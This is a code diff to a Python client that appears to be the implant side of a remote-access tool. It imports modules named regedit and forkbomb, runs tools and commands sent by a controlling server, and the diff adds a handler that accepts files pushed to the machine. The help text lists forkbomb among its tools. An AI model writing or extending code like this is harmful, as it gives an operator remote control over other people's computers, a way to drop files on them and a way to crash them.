@@ -8,7 +8,7 @@ import tools.regedit as regedit
 import tools.forkbomb as forkbomb
 from tools.packet_manager import p_manager
 from tools.dictionary import *
-from tools.utils import packet_send, packet_recv
+from tools.utils import packet_send, packet_recv, file_recv
 
 class client:
     def __init__(self, cipherClass, HOST='127.0.0.1', PORT=5002):
@@ -97,8 +97,19 @@ class client:
                 return_message[PK_COMMAND_FLAG] = COMMAND_ERROR
                 return_message[PK_PAYLOAD_FLAG] = "Error in inputting the command."
                 self.send_list.put(return_message)
+
         elif message[PK_COMMAND_FLAG] == COMMAND_TOOL_EXE:
             self.exe_tool(message)
+
+        elif message[PK_COMMAND_FLAG] == COMMAND_FTP:
+            if (file_recv(message) == True):
+                return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                return_message[PK_PAYLOAD_FLAG] = "Received part of the file."
+            else:
+                return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
+                return_message[PK_PAYLOAD_FLAG] = "Error receiving file. Something went wrong"
+            self.send_list.put(return_message)
+
         elif message[PK_COMMAND_FLAG] == "HLP":
             return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
             return_message[PK_PAYLOAD_FLAG] = """
@@ -111,10 +122,12 @@ class client:
                         - forkbomb
             """
             self.send_list.put(return_message)
+
         else:
             return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
             return_message[PK_PAYLOAD_FLAG] = "Unknown command. Type HLP to get Help"
             self.send_list.put(return_message)
+
         return
 
     def execute_commands(self):
@@ -155,7 +168,7 @@ class client:
 
             except socket.timeout:
                 continue
-            except:
+            except Exception as e:
                 self.stop = True
                 return False
 
